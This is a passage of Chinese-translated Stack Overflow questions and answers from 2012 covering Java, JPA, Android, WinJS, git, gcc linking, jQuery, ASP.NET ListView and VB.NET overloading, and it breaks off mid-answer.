我不熟悉 Java 和 Crypt API，但在我看来您遇到了**编码**问题。由于加密的输出是二进制的，API 很可能对其进行了编码，并且看起来您`base64`默认获得了编码。因此，我会查看 API 规范以了解如何更改/设置编码并使用不同的编码，例如十六进制。

您可以通过获取 API 的加密输出并将其传递给 base64 解码器（Linux`base64`工具或在线解码器）来测试假设。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T12:54:42.317

> 我需要将此 URL 传递给 JS 函数，在该函数中抛出未终止的字符串常量失败

在我看来，您实际上需要转义此字符串以在 Javascript 中使用。例如参见 Apache Commons [StringEscapeUtils.escapeJavascript()](http://commons.apache.org/lang/api-2.4/org/apache/commons/lang/StringEscapeUtils.html#escapeJavaScript%28java.lang.String%29)。

我非常怀疑您是否可以逐个字符地控制加密。这将取决于所使用的算法，但可能会通过查看数据块来生成数据块。毕竟是加密。

# sql - EJB/JPA：违反约束和幂等性

> ID：13703373
> 
> 赞同：0
> 
> 时间：2012-12-04T12:52:15.230
> 
> 标签：sql, jpa, orm, ejb, one-to-many

我正在开发一个休闲羽毛球联赛的门户网站（注册和分析比赛统计数据）。昨天，当我开始实现一个显示团队统计数据的视图（例如打/赢/输的比赛......）时，我发现了一个神秘的漏洞。

当我用查询检索所有球队时，应该包含在客场比赛的系列赛的字段也包括在主场比赛的系列赛。但是，包含在主场进行的系列赛的字段不包含在客场进行的系列赛（这是我想要的行为）。

此外，如果我再次执行查询（更新页面），包含客场比赛系列的字段开始增长。每次我执行查询时，主场比赛集都会在 awaySeries 字段中再次注册。

例如：

**第一个查询：**

*团队1*

gameSeriesAway：Team1 vs Team2，*Team1 vs Team3*

gameSeriesHome：Team1 vs Team3

**第二个查询：**

*团队1*

gameSeriesAway：Team1 vs Team2，*Team1 vs Team3*，*Team1 vs Team3*

gameSeriesHome：Team1 vs Team3

**团队.java**

```
@Entity
@NamedQueries({@NamedQuery(name = "Team.findAll", query="SELECT distinct t FROM Team t")})
public class Team implements Comparable<Team> {

    public static final String FIND_ALL_TEAMS = "Team.findAll";
    //Fields
    @Id
    private String name;
    private String description;

    //Relationships
    @OneToMany(mappedBy = "team")
    private List<Player> players;

    @ManyToMany
    private List<Division> divisionHistory;

    @OneToMany(mappedBy="homeTeam")
    private List<GameSeries> homeSeries;

    @OneToMany(mappedBy="awayTeam")
    private List<GameSeries> awaySeries;

    ...
    ...

    @Override
    public boolean equals(Object obj) {
        if(obj instanceof Team)
            return name.equals(((Team) obj).name)? true:false;
        return false;
    }

    @Override
    public int hashCode() {
        return name.hashCode();
    }
} 
```

**游戏系列.java**

```
@Entity
public class GameSeries {
    public static final int NUMBER_OF_GAMES = 5;

    // Fields
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    private long id;

    @Column(nullable = false)
    private Timestamp playDate;

    // Relationships
    @OneToMany(mappedBy = "series")
    private List<Game> games;

    @ManyToOne
    private Division division;

    @ManyToOne
    private Team homeTeam;

    @ManyToOne
    private Team awayTeam;

    @Override
    public boolean equals(Object obj) {
        if (obj instanceof GameSeries)
            return playDate.equals(((GameSeries) obj).playDate)
                && homeTeam.equals(((GameSeries) obj).homeTeam)
                && awayTeam.equals(((GameSeries) obj).awayTeam) 
                ? true : false;
        return false;
    }

    @Override
    public int hashCode() {
       return  playDate.hashCode() + 2*homeTeam.hashCode() + awayTeam.hashCode();
    }
} 
```

对应的表格如下所示：

**游戏系列**

* * *

id PRIM

播放日期

awayTeam_name MUL

Division_id MUL

homeTeam_name MUL

* * *

**团队**

* * *

名称 PRIM

描述

* * *

我有一种预感，这是一个非常容易解决的问题，但是由于我是 JPA/EJB 的新手，所以我无法弄清楚这个问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T16:27:29.750

逐行调试代码后，似乎发现了错误。

在我的统计实用程序类中，我将 awayGameSeries 和 homeGameSeries 加入到一个列表中：

```
List<GameSeries> allSeries = new ArrayList<GameSeries>(team.getAwaySeries());
allSeries.addAll(team.getHomeSeries());

... compute statistics for all game series 
```

新的**ArrayList(argument)** “指向”原始 awayGameSeries，因此将对象添加到新列表也会附加 awayGameSeries。（即当**addAll(team.getHomeSeries());**行被执行时，homeGameSeries 被添加到 awayGameSeries）

要解决这个问题，只需添加一行代码：

```
List<GameSeries> allSeries = new ArrayList<GameSeries>();
allSeries.addAll(team.getAwayGameSeries());
allSeries.addAll(team.getHomeSeries()); 
```

# android - 在 onItemselection 事件之后放置异步任务时未获取 Android 微调器项目位置

> ID：13703374
> 
> 赞同：0
> 
> 时间：2012-12-04T12:52:20.470
> 
> 标签：android

我有以下微调器点击事件代码：当异步任务包含在其中时，我无法获得点击项目的位置

```
spinner2.setOnItemSelectedListener(new OnItemSelectedListener() {
    @Override
    public void onItemSelected(AdapterView<?> parent, View arg1, int pos, long arg3) {

        int index = parent.getSelectedItemPosition();

        Downloadsuborderpackage task = new Downloadsuborderpackage();
        task.execute(new String[] { "" });
    }

    @Override
    public void onNothingSelected(AdapterView<?> arg0) {

    }
}); 
```

但是当我执行异步任务时，`Downloadsuborderpackage`我无法获得项目位置。

如果该异步任务被评论，我可以获得所选项目的位置。

为什么 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:59:56.090

写在下面的代码行以获取选定的项目索引

```
int index = spinner2.getSelectedItemPosition(); 
```

代替

```
int index = parent.getSelectedItemPosition(); 
```

它会解决你的问题。

# windows-8 - WinJS 是否有#DEBUG 或#RELEASE 指令？

> ID：13703378
> 
> 赞同：0
> 
> 时间：2012-12-04T12:52:32.243
> 
> 标签：windows-8, winjs

我想在使用发布与调试时排除一些代码。基本上我有一个用于测试的内部管理部分，我不会偶然进入应用商店:)

理想情况下，我只能做这样的事情：

```
#IF DEBUG
    <div id="appBar" data-win-control="WinJS.UI.AppBar">
        <button data-win-control="WinJS.UI.AppBarCommand" data-win-options="{id:'cmdAdmin', label:'Admin', section:'global' }">
        </button>
    </div>
#ENDIF 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T15:12:56.940

见[这里](http://caioproiete.net/en/detect-debug-build-configuration-via-javascript-in-windows-store-apps/)。[这里](https://nuget.org/packages/WinRT-JsDebugSymbols/1.0.0)有一个 nuget 包可以启用它，而无需直接将代码添加到您的项目中。拥有它之后，您只需执行以下操作：

```
<script src="/js/debugSymbols.js"></script> 

if (Debug.isDebugBuild) { 
```

如果您使用 nuget 包，以下是您不需要的完整代码：

```
(function () {     
   "use strict";
   if (Debug.hasOwnProperty("isDebugBuild")) {
     return;
   }
   var thisPackage = Windows.ApplicationModel.Package.current,
            installedPath = thisPackage.installedLocation.path;
   if (typeof installedPath === "string") {

       if (installedPath.match(/\\debug\\appx$/i)) {

           Object.defineProperty(Debug, "isDebugBuild", {
              get: function () {
                 return true;
              }
           });
       }
   }
})(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-07T03:07:30.057

我一直在研究它，我发现了以下内容（基于您的 VS 解决方案中的配置管理器）

*   在 VS 解决方案中为每个配置保留不同的文件。 [http://www.kraigbrockschmidt.com/2014/02/25/differentiate-debug-release-builds-javascript/](http://www.kraigbrockschmidt.com/2014/02/25/differentiate-debug-release-builds-javascript/)

此外，我正在考虑使用 MSBuild 任务（或 MSBuild 内联任务）来根据当前配置（例如 DEBUG、RELEASE）替换特定文件中的文本。这应该发生在 beforeBuild 事件中。这也可能适用于根据部署设置特定值。

干杯，香草

# git - 修复 GIT 中先前提交的最佳方法

> ID：13703381
> 
> 赞同：1
> 
> 时间：2012-12-04T12:52:36.783
> 
> 标签：git

假设在他的分支中进行一些开发工作并进行这些提交：

```
A -> B -> C -> D -> E 
```

我是审阅者，我注意到在提交 B 中，一些不应该更改的文件已更改。

我正在尝试找到解决这种情况的最佳方法，我想做：

```
A -> B -> X -> Y -> C -> D -> E 
```

在哪里：

*   X 是 B 的回归
*   Y 是 B，没有不必要的更改

我正在考虑执行以下操作，但我知道它看起来并不完全相同：

*   B 上的 git checkout -b
*   在 X 中恢复 B
*   在 Y 中以更好的方式做 B
*   在我的分支中合并 CDE
*   将所有内容放回 dev 分支

上述方法有效吗？这是最好的方法还是有更好的方法？

注意：我很想听听任何涉及重写历史的解决方案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T12:57:11.043

由于这个分支已被推向上游并公开 -**不要重写它的历史**。这将破坏其他开发人员的分支。

你应该做的是：

```
A -> B -> C -> D -> E -> X -> Y 
```

保持历史直到 E （我假设是`HEAD`）。然后`git revert B`它将错误的提交恢复为 commit `X`。然后用你的 commit 修复它`Y`。

或者，您可以`git revert -n B`，它将等待提交并允许您编辑提交，从而在单个提交中包含所有修复（`X`仅，否`Y`）。这是处理这个问题的更优雅的方式。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-04T12:59:57.810

正如您自己指出的那样，恢复 B 本身是一个单独的提交， (X) 和 (Y) 再次是一个额外的提交，没有不需要的文件。为什么不删除不需要的文件并提交一次而不恢复原始提交？像这样： A -> B -> C -> D -> E -> Z 提交 Z 删除不需要的文件（如果它们仍然存在）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T13:28:17.513

所以我找到了一个适合我需要的解决方案`rebase -i`（我不在乎在这个功能分支案例中重写历史）

*   git rebase -i A （B 之前的提交）
*   git reset HEAD^1 文件名（在不需要更改的文件上尽可能多地执行此操作）
*   git commit --amend
*   git rebase -- 继续

我喜欢它，因为它确实满足了我的需要：手动删除我想从提交中删除的文件，而不是合并。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:29:18.277

Yuval 的回答是开发这个分支的正确方法，但是如果这是一个与主分支分开工作的特性分支，并且将来会被合并（例如，这些提交是打开`dev`的，主分支是`master`）：

1.  根据 Yuval 的回答恢复`X`并修复`Y`
2.  正常发展
3.  当要合并功能时，运行`git rebase -i master`
4.  移动`X`并`Y`立即跟随`B`
5.  可选地，标记`X`和`Y`作为`fixup`，它们将被压缩成`B`
6.  修复`C`,`D`和`E`

您现在有一个本地`dev`分支，其中按您想要的顺序提交。您现在可以将此分支合并到`master`并删除该`dev`分支；这样，您就拥有了您想要的干净历史，而不会破坏任何人的开发工作。

# gcc - 打印 gcc ld 错误详细信息的任何方式

> ID：13703397
> 
> 赞同：-2
> 
> 时间：2012-12-04T12:53:30.073
> 
> 标签：gcc

我想在我的代码中添加一个库。所以当我编译它时，我使用 -l 选项。但 gcc 以 ld 错误终止。我什至尝试使用 pkg-config 生成 gcc 标志，但这些标志仍然不起作用。

所以，我认为我需要一个解决方案来获取有关此错误的真实信息，如何让 gcc 打印 ld 错误详细信息？

像clang++这样的其他编译器也可以完成这项工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:58:45.447

`ld`是*binutils*的一部分，并接受[许多选项](http://sourceware.org/binutils/docs-2.23.1/ld/Options.html)。也许你想传递`--verbose`给它。

`gcc`正在运行`ld`并且还具有[链接选项](http://gcc.gnu.org/onlinedocs/gcc/Link-Options.html)。传递`-v`给它`gcc`以获取`ld`它正在运行的确切命令。

也许你应该链接到`gcc -v -Wl,--verbose`

# android - 包含引用好/坏的属性

> ID：13703400
> 
> 赞同：7
> 
> 时间：2012-12-04T12:53:35.780
> 
> 标签：android

我是 Android/Java 的新手（通常使用 PHP 和 JavaScript）。我已经阅读了几篇关于当引用被错误地使用时应用程序的内存泄漏问题的文章，所以我有一个关于我在其他人的工作中经常看到的问题的问题。

很多人，当他们需要在多个方法中访问诸如 Views 之类的东西时，会在创建 Activity 期间分配的属性中保留对 this 的引用。从我读过的内容（或至少理解我读过的内容）来看，这是内存泄漏的课程之一？

为对象分配一个 ID，然后在每个方法中搜索它们会更好吗？如果是这样，那么动态创建的对象呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:02:14.000

如果你正确使用它们很好，如果你不使用它们就很糟糕。

仅当您将活动之外的某些内容传递给另一个类并且该类的生命周期大于活动的生命周期时，您才会泄漏。一旦它不再是前台活动，Android 可能会破坏您的活动，并且如果活动之外的东西持有对它的引用，那么垃圾收集器将无法将内存释放回堆。

对活动上下文、静态和单例要特别小心。

简单地在活动中保留对视图的引用是绝对正常的。

这是一个坏的例子（伪代码）；

```
public class MyApplication extends Application{
    public static ImageView activityBackgroundImageView;
}

public class MyActivity extends Activity{

    ImageView iv = findViewById(R.id.myImageView);
    myApplication.activityBackgroundImageView= iv; // <==== LEAK

} 
```

实际上，泄漏并不存在，它仅在（如果） myActivity 完成（）或销毁时泄漏。

每个对象都有一个引用计数——有多少对象持有对它的引用。在 Activity 中设置对 ImageView 的引用后，引用计数为 1。然后将该引用复制到 Application 类。注意。Java 中的所有内容都是按值传递的，因此您传递引用的值，正是该值的副本——即对同一对象的新引用。ImageView 上的引用计数现在是两个。

稍后，您完成（）您的活动并且引用计数减少。现在是一个。垃圾收集器无法释放该 ImageView 对象，因为它的引用计数不为零。

当然，您可以通过将应用程序中的引用设为空来修复它，但您现在有了意大利面条代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T17:56:48.690

感谢您的回答，只是想在创建一个会给人们带来问题的应用程序之前先确定一下。

作为一项安全措施，我添加了 onStop 和 onRestart 来删除和重新创建引用。这应该确保应用程序在后台时不存在任何此类内容，尽管我从未在静态属性中使用引用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:00:26.603

`Context`您在 Android 中提到的泄漏问题发生在对也持有对对象的引用的事物的引用被*不*绑定到 UI 的事物持有时。在其包含的活动中保持对视图的引用，因为在某些时候该活动将不再被系统中的任何东西引用（之后`onDestroy()`），并且因为不再有来自垃圾收集根的引用（如全局变量） ，它有资格进行垃圾收集。换句话说，一旦没有*其他人*持有对该活动的引用，在活动及其视图之间建立的循环引用就不再重要。

问题出现的地方是发送对活动的引用——它本身*就是*一个`Context`——在 UI 和活​​动生命周期调用之外。诸如位置侦听器之类的东西或您忘记注销的东西。这将保持该引用使整个树没有资格进行垃圾收集。因此，大泄漏。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:40:30.103

您对内存泄漏原因的观察并不完全正确。

存储对视图元素的引用非常好，您如何执行此操作并使用它们可能会导致内存泄漏。例如，避免使用静态引用，例如，如果您静态引用位图图像，您可能会无意中导致垃圾收集问题，正如 Simon 在他的回答中指出的那样。

因此，可以执行以下操作。

```
class{
 private TextView myTextView;

onCreate()
 myTextView = findViewById(R.id.mytextview);

myMethod()
 myTextView.text = "hello view."

} 
```

myMethod 使用现有的参考纯粹是为了方便，没有什么能阻止你把

```
findViewById(R.id.mytextview).text = "hello view"; 
```

但是，如果您有很多参考资料，那将导致代码非常不可读。因此，您可以使用局部范围变量。

```
myMethod()
 TextView myTextView = findViewById(R.id.mytextview);
 myTextView.text = "Hello"
 ..... 
```

根据您的个人喜好，它不一定会导致内存泄漏。

现在这里的问题是 findViewById 是一个密集的过程，所以你真的不想重复调用它。列表视图特别容易出现这种情况，如果你不满足这种情况，它会显着减慢速度。

因此，在列表视图中，您会发现人们实现了 viewHolder 模式。您分配对视图子元素的引用的小对象。然后将此对象分配给父视图的 Tag 属性。在对视图的后续调用期间，您测试查看视图标记属性是否具有 viewHolder，如果有，它将引用子对象，从而节省您每次需要更新视图内容时调用 findViewById 的时间和精力。

非常粗略的想法，其实现方式略有不同。viewHolder = 新的 ViewHolder(); viewHolder.myTextField = findViewById(R.id.mytextview); myView.setTag(viewHolder) .... if (viewHolder) viewHolder.text = "hello"

请注意，您只能在列表视图中使用它。我没有将其用作一般的经验法则。

查找列表视图适配器的有效视图持有者模式。

# facebook - 如何限制我的 Facebook 封面照片不被他人复制？

> ID：13703401
> 
> 赞同：-2
> 
> 时间：2012-12-04T12:53:38.117
> 
> 标签：facebook, facebook-graph-api, facebook-like, facebook-javascript-sdk

在 Facebook 中，我有一张图片作为封面照片。我希望这张照片不应该被其他人复制，但他们可以将其视为我的封面照片。是否可以？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T12:58:06.597

那是不可能的。facebook 用户将始终能够单击他计算机上的“打印屏幕”键并将整个桌面图像复制到他的剪贴板。然后他可以剪切您的图像并为自己存储。

# jquery - jQuery插件不起作用

> ID：13703403
> 
> 赞同：0
> 
> 时间：2012-12-04T12:53:40.450
> 
> 标签：jquery, function, jquery-plugins, plugins

我已经阅读了很多关于 jQuery 插件的内容，并尝试为我自己的网站制作一些东西。这是我的第一个脚本，基本上它只是为了好玩.. 不知何故插件不起作用..

这是我的插件

```
 ;(function($){

     // We name the function mouser
     $.fn.mouser = function(options) {

         // Default settings - can be replaced by options
         var defaults = {
             mouse: "click"     // click is an event that contains both the mousedown and mouse up event in one.
         }

         // Extend the options and defaults to variables
         var opts = $.extend(defaults, options);

         // Now start the Function
         return this.each(function() {

             // The original element is defined with a variable
             var element = $(this)

             // We have to define the functions that has to react based on the option 'mouse'
             // So if it is - as standard - set to 'click'
             if (opts.mouse == "click") {

                 // ... we want to do a 'click'-function (Basic jQuery)
                 // when the element is clicked
                 element.click(function(e) {

                     // ... we ensure which mouse button has been pressed
                     switch (e.which) {

                         // ... and execute a function based on that information

                         // Left Mouse Button
                         case 1: {left_mouse_command(); return false;}

                         // Middle Mouse Button
                         case 2: {middle_mouse_command(); return false;}

                         // Right Mouse Button
                         case 3: {right_mouse_command(); return false;}

                     };

                 });

             // Else if 'mouse' is set to 'mouseup'
             } else if (opts.mouse == "mouseup") {

                 // ... we want to do a 'mouseup'-function (Basic jQuery)
                 // when the mouse is released from the element
                 element.mouseup(function(e) {

                     // ... we ensure which mouse button has been pressed
                     switch (e.which) {

                         // ... and execute a function based on that information

                         // Left Mouse Button
                         case 1: {left_mouse_command(); return false;}

                         // Middle Mouse Button
                         case 2: {middle_mouse_command(); return false;}

                         // Right Mouse Button
                         case 3: {right_mouse_command(); return false;}

                     };

                 });

             // Else if 'mouse' is set to 'mousedown'
             } else if (opts.mouse == "mousedown") {

                 // ... we want to do a 'mousedown'-function (Basic jQuery)
                 // when the mouse begins to click on the element
                 element.mousedown(function(e) {

                     // ... we ensure which mouse button has been pressed
                     switch (e.which) {

                         // ... and execute a function based on that information

                         // Left Mouse Button
                         case 1: {left_mouse_command(); return false;}

                         // Middle Mouse Button
                         case 2: {middle_mouse_command(); return false;}

                         // Right Mouse Button
                         case 3: {right_mouse_command(); return false;}

                     };
                 }); 
             };
         });
     };
 })(jQuery); 
```

然后我这样调用函数：

```
$(document).ready(function() {

    $(document).mouser();

    function left_mouse_command() {
        alert('You clicked with the left mouse button');
    }

    function middle_mouse_command() {
        alert('You clicked with the middle mouse button');
    }

    function right_mouse_command() {
        alert('You clicked with the right mouse button');
    }
}); 
```

谁能找到错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:19:44.560

这些功能`xxxxxx_mouse_command()`超出了插件的范围。您应该将它们从`$(document).ready()`全局范围移动。

编辑：每个命令的最后一个命令`case`应该是`break;`而不是`return false;`. 您应该将 a 放在`e.preventDefault()`每个处理程序的末尾。您不需要将`case`命令包装在 {} 括号中

缺少一些分号，并且您在 switch 和 if 语句的末尾添加了一些“不寻常的”分号

尝试这个

```
;(function($){

 // We name the function mouser
 $.fn.mouser = function(options) {

     // Default settings - can be replaced by options
     var defaults = {
         mouse: "click"     // click is an event that contains both the mousedown and mouse up event in one.
     };

     // Extend the options and defaults to variables
     var opts = $.extend(defaults, options);

     // Now start the Function
     return this.each(function() {

         // The original element is defined with a variable
         var element = $(this);

         // We have to define the functions that has to react based on the option 'mouse'
         // So if it is - as standard - set to 'click'
         if (opts.mouse == "click") {

             // ... we want to do a 'click'-function (Basic jQuery)
             // when the element is clicked
             element.click(function(e) {

                 // ... we ensure which mouse button has been pressed
                 switch (e.which) {

                     // ... and execute a function based on that information

                     // Left Mouse Button
                     case 1: left_mouse_command(); break;

                     // Middle Mouse Button
                     case 2: middle_mouse_command(); break;

                     // Right Mouse Button
                     case 3: right_mouse_command(); break;

                 }

                 e.preventDefault();

             });

         // Else if 'mouse' is set to 'mouseup'
         } else if (opts.mouse == "mouseup") {

             // ... we want to do a 'mouseup'-function (Basic jQuery)
             // when the mouse is released from the element
             element.mouseup(function(e) {

                 // ... we ensure which mouse button has been pressed
                 switch (e.which) {

                     // ... and execute a function based on that information

                     // Left Mouse Button
                     case 1: left_mouse_command(); break;

                     // Middle Mouse Button
                     case 2: middle_mouse_command(); break;

                     // Right Mouse Button
                     case 3: right_mouse_command(); break;

                 }
                 e.preventDefault();
             });

         // Else if 'mouse' is set to 'mousedown'
         } else if (opts.mouse == "mousedown") {

             // ... we want to do a 'mousedown'-function (Basic jQuery)
             // when the mouse begins to click on the element
             element.mousedown(function(e) {

                 // ... we ensure which mouse button has been pressed
                 switch (e.which) {

                     // ... and execute a function based on that information

                     // Left Mouse Button
                     case 1: left_mouse_command(); break;

                     // Middle Mouse Button
                     case 2: middle_mouse_command(); break;

                     // Right Mouse Button
                     case 3: right_mouse_command(); break;

                 }
                 e.preventDefault();
             }); 
         }
     });
 }
})(jQuery); 
```

和

```
$(document).ready(function() {
   $(document).mouser();
});

function left_mouse_command() {
    alert('You clicked with the left mouse button');
}

function middle_mouse_command() {
    alert('You clicked with the middle mouse button');
}

function right_mouse_command() {
    alert('You clicked with the right mouse button');
} 
```

# jquery - jquery：将类添加到或 从价值

> ID：13703405
> 
> 赞同：0
> 
> 时间：2012-12-04T12:53:40.570
> 
> 标签：jquery

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:05:00.833

```
$('a:contains('+ $(this).val()+')').addClass('newClass'); 
```

# c# - 如何在我的 ASP.NET ListView 中创建 If 子句？

> ID：13703409
> 
> 赞同：2
> 
> 时间：2012-12-04T12:53:46.280
> 
> 标签：c#, asp.net, image, listview, itemtemplate

我有一个带有 ListView 的 ASP.NET 应用程序。ListView 从 DataTable 获取数据，如果我的 ListView 构建 itemtemplate 我有一个用于更改内部图像的 if 子句，我想要。

例如：

我的 DataTable 有一个名为 Enable 的列。这可以有两个值。第一个值为 0，第二个值为 1。如果在我的列中是值 0，我想要 a.png，如果我的 asp:image 控件（在我的列表视图中）中有 1 个其他图像。

这是我的 aspx 网站：

...

```
 <ItemTemplate>
        <tr onmouseover="this.style.backgroundColor='#87CEFA'"
        onmouseout="this.style.backgroundColor='#ffffff'">
            <td align="left"><span class="spanpading"><asp:Label ID="lblname" Text='<%# Eval("NAME") %>' runat="server"  /></span></td>
            <td align="left"><span class="spanpading"><asp:Label ID="lblcompany" Text='<%# Eval("COMPANY") %>' runat="server"  /></span></td>
            <td align="left"><span class="spanpading"><asp:Label ID="lblVon" Text='<%# Eval("TIMEFROM") %>' runat="server"  /></span></td>
            <td align="left"><span class="spanpading"><asp:Label ID="lblBis" Text='<%# Eval("TIMETO") %>' runat="server"  /></span></td>
            <td align="left"><span class="spanpading"><asp:Label ID="lblErsteller" Text='<%# Eval("CREATOR") %>' runat="server"  /></span></td>
            <td align="left"><asp:ImageButton ID="imgDelete" runat="server" ToolTip="löschen" ImageUrl="images/delete.gif" CommandName="DeleteClick" CommandArgument='<%# Container.DataItemIndex %>' /></td>
            <td align="left"><asp:ImageButton ID="imgUpdate" runat="server" ToolTip="ändern" ImageUrl="images/edit.gif" CommandName="UpdateClick" CommandArgument='<%# Container.DataItemIndex %>' /></td>
            <td align="left"><asp:ImageButton ID="imgEmail" runat="server" ToolTip="Zugangsdaten senden" ImageUrl="images/send.gif" CommandName="SendClick" CommandArgument='<%# Container.DataItemIndex %>' /></td>
           <% if ()
              { %>

             <td align="left"><asp:Image ID="imgActive" runat="server" ToolTip="Aktiv" Width="25px" Height="25px" ImageUrl="images/yes.gif"/></td>

             <% } %>

            <td><asp:Label ID="lblID" runat="server" Text='<%# Eval("ID") %>' Visible="False" ></asp:Label></td>
        </tr>
    </ItemTemplate> 
```

...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T12:59:02.210

您可以使用像 eg 这样的块元素`<span>`，使其在服务器上运行并根据数据绑定元素切换其可见性。

例如：

```
<span runat="server" Visible='<%# Eval("IsConditionTrue") %>'>
    <!-- ... Place your conditionally visible tags here inside ... -->
</span> 
```

如果您无法评估单个条件，您还可以使用更复杂的语句，例如

```
<span runat="server" 
      Visible='<%# (int)Eval("SomeValue")==1 && (bool)Eval("SomeOtherValue") %>'>
    <!-- ... Place your conditionally visible tags here inside ... -->
</span> 
```

最后，要了解您的具体示例，我认为您可以执行以下操作：

```
<span runat="server" Visible='<%# (int)Eval("Enable")==1 %>'>
    <asp:Image ImageUrl="images/yes.gif" />
</span>
<span runat="server" Visible='<%# (int)Eval("Enable")!=1 %>'>
    <asp:Image ImageUrl="images/no.gif" />
</span> 
```

当然，[MHD。对于您的情况， Yasseen 的回答](https://stackoverflow.com/a/13703610/107625)似乎是最短的：

```
<asp:Image ImageUrl='<%# (int)Eval("Enable")==1 ? "yes.gif" : "no.gif" %>' /> 
```

请注意，您必须像在原始问题中一样`runat="server"`向`Image`标签添加其他属性。为了便于阅读，我在上面的代码中省略了它们。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:03:16.030

```
ImageUrl=<%# (bool)Eval(condition)? "a.png" : "b.png" %> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T13:11:33.740

我认为您应该处理 .aspx 文件，而不是在 .aspx 文件中执行此操作`ListView.ItemDataBound Event`。

```
protected void ListView1_ItemDataBound(object sender, ListViewItemEventArgs e)
    {

        if (e.Item.ItemType == ListViewItemType.DataItem)
        {

            Image imgActive = (Image)e.Item.FindControl("imgActive");
            System.Data.DataRowView rowView = e.Item.DataItem as System.Data.DataRowView;
            string value = rowView["Enable"].ToString();
            if (value == "1")
            {
                imgActive.ImageUrl="~/images/imageA.gif"; 
            }
            else
            {
                imgActive.ImageUrl="~/images/imageB.gif"; 
            }
        }
    } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-04T12:58:44.603

```
if(((YourDataTable) Container.DataItem).Enable){
} 
```

所以你可以这样做：

```
<% if (((YourDataTable) Container.DataItem).Enable)
      { %>

          <td align="left"><asp:Image ID="imgActive" runat="server" ToolTip="Aktiv" Width="25px" Height="25px" ImageUrl="images/yes.gif"/></td>

     <% } %> 
```

# vb.net - VB.NET 制作多个同名但参数不同的子程序

> ID：13703410
> 
> 赞同：2
> 
> 时间：2012-12-04T12:53:52.307
> 
> 标签：vb.net

我想制作多个名称相同但参数不同的潜艇。

例如：

```
Public Sub DoThis(Byval CustomerName As String)   
Public Sub DoThis(Byval CustomerID As Integer)
Public Sub DoThis(Byval CustomerID As Integer, ReferenceID As Integer) 
```

但随后 VB.NET 告诉我这样的子程序已经存在。有人可以告诉我我该怎么做吗？

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-04T13:12:33.167

您向我们展示的内容绝对有效——VB 不会抱怨这一点。

这称为*重载*，它是 .NET 的基本功能。然而，为了使它工作，您需要确保签名（即参数类型列表）对于所有重载都是严格*不同的。*

这是一个示例来展示不同参数类型列表的重要性：

```
Sub DoThis(CustomerName As String) …
Sub DoThis(ProductName As String) … 
```

潜艇看起来很明显。但是VB应该如何处理下面的调用呢？

```
DoThis("Meyer") 
```

它无法知道“Meyer”是客户名称还是产品名称（事实上，它也可能是任何一个！）——因此 VB 禁止这些声明。但是，以下内容绝对可以，因为明确：

```
Sub DoThis(Customer As Customer)
Sub DoThis(Product As Product) 
```

```
DoThis(New Customer("Meyer")) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:13:08.177

自从我做 VB .NET 以来已经有一段时间了，但我认为你需要添加 Overloads 关键字，所以它会变成：

```
Public Overloads Sub DoThis(Byval CustomerName As String)   
Public Overloads Sub DoThis(Byval CustomerID As Integer)
Public Overloads Sub DoThis(Byval CustomerID As Integer, ReferenceID As Integer) 
```

# jquery - 在每个 onclick 函数之前调用一个通用函数

> ID：13703411
> 
> 赞同：3
> 
> 时间：2012-12-04T12:53:55.827
> 
> 标签：jquery

当前代码

```
<a onclick="callMe1()">Click Me</a>
<a onclick="callMe2()">Click Me 2</a>

function callMe(){
   //anything
}

function callMe2(){
   //anything
} 
```

等等...我有数百个 onclick 事件函数。

我想添加这个应该在任何 onclick 事件函数之前调用的函数。

```
function callBeforeAnyOnClick(){
//This should be executed before callMe() and callMe2().
//once execution is complete, it should call a function as per onclick event,callMe() or callMe2().
} 
```

有什么解决办法吗？jquery 绑定会在这里工作吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:04:24.467

The way the DOM + JS works, you can't "hijack" the order of execution when mixing/matching library (jquery) event handling and inline script event handling. Two things come to mind:

1.  Use a mousedown/up event, which will fire before the click event.
2.  Modify/manipulate the DOM with jquery after load so you have more control.

Pseudo Example of option #2:

```
$(function()
{

  $('a[onclick]').click(function() { /* your normal on click here */ });

  // now modify the DOM to convert the onclick attr into a function call
  $('a[onclick]').each(function()
  {
    var clickFunction = $(this).attr('onclick');

    // remove the attr
    $(this).attr('onclick', '');

    // might be a better way than calling eval on the inline function, but this serves its purpose for the demo
    $(this).click(function() { eval(clickFunction); });
  });
}); 
```

So in the above example, I remove the onclick attr and conver it to a jquery click event handler, and I do it second, not first, so it happens after my newly inserted pre-onclick function.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:20:36.197

您正在寻找的是观察者模式的经典示例。这在 javascript 中很难实现，特别是如果将 JS 与 jQuery 混合使用，还因为您想要监听的是事件（本身就是观察者）。我会在文档上添加一个侦听器，并且仅在为元素定义了 onclick 函数时才执行它（注意：如果您使用 jQuery 中的 .on 添加事件侦听器，这将不起作用）：

```
function observerMethod(e) {
  if (e.target.onclick) {
